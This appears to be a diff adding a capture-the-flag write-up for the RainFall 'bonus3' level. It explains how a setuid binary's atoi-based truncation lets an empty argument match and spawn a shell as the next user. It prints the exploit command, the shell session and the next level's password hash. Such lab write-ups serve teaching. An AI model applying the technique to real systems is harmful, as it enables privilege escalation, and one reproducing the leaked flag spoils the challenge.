@@ -1,0 +1,60 @@
+## disassembel main:
+
+the program start with reserve 0xa0 bytes then open 0x80486f2 file with 0x80486f0 mode
+
+```bash
+x/s 0x80486f0
+0x80486f0:	 "r"
+x/s 0x80486f2
+0x80486f2:	 "/home/user/end/.pass"
+```
+
+```c
+    fp = fopen("/home/user/end/.pass", "r");
+```
+
+and read 66 bytes from that file to strore it  in buffer1
+
+```c
+    fread(entry1, 1, 66, fp);
+    entry1[65] = '\0';
+    entry1[atoi(argv[1])] = '\0';
+```
+
+then it's read another 65 bytes
+
+```c
+    fread(entry2, 1, 65, fp);
+
+    fclose(fp);
+```
+
+after it compare argv[1] with the first 66 readed bytes
+
+```c
+    if (strcmp(entry1, argv[1]) == 0) {
+        execl("/bin/sh", "sh", NULL);
+    } else {
+        puts(entry2);
+    }
+```
+
+but there is something special:
+
+```c
+    entry1[atoi(argv[1])] = '\0';
+```
+
+so if i enter something like "0" entry1 will be "" and compare with "0"
+
+so argv[1] = "" will compare with entry1 as ""
+
+```bash
+bonus3@RainFall:~$ ./bonus3 ""
+$ ls
+ls: cannot open directory .: Permission denied
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
